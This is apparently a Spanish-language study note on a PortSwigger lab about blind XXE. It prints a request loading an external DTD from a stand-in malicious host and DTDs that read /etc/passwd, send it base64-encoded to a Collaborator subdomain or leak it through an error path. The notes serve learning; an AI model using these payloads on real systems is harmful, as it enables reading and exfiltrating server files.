# XXE ciego para filtrar datos con errores

Tags: #XXE #PortSwigger #XML 


```bash 
En este lab se aborda una variante de XXE ciegas que se apoya en mensajes de error para filtrar información sensible. Continuamos aprovechando el sistema de entidades parametrizadas, pero en lugar de usar canales externos como Collaborator, utilizamos rutas inválidas para provocar errores intencionados que revelen el contenido del archivo /etc/passwd.

Preparamos una DTD maliciosa en nuestro exploit server que lee ese archivo y lo introduce como parte de una ruta errónea. Al invocar esa DTD desde el XML enviado al endpoint vulnerable, el servidor intenta acceder a una ruta inválida que incluye el contenido del archivo, lo que provoca un error con el texto completo de la entidad.
```

```xml 
<!-- Petición modificada colocando una entidad de parámetro -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://maliciousWeb.com"> %xxe; ]>      
	<stockCehck>
		<productId>
			1
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>
```

## DTD malicioso en maliciousWeb

```xml
<!-- Colocar la DTD maliciosa en el exploit server para mostrar el contenido del '/etc/passwd' en base64 -->

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">   
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?content=%file;' >">
%eval;
%exfil;


Notas:
	1. Colocar % en hexadecimal = &#x25, esto se hara en la segunda entidad de parámetro para que sea visualizada como un texto y no lo expanda 
	2. exfil = Exfiltra la data
```

```xml 
<!-- Otra forma de hacerlo es usando los mensajes de error para cargar el contenido en la respuesta del error --> 

<!ENTITY % file SYSTEM "file:///etc/passwd">   
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///noexisto/%file;' >">
%eval;
%exfil;
```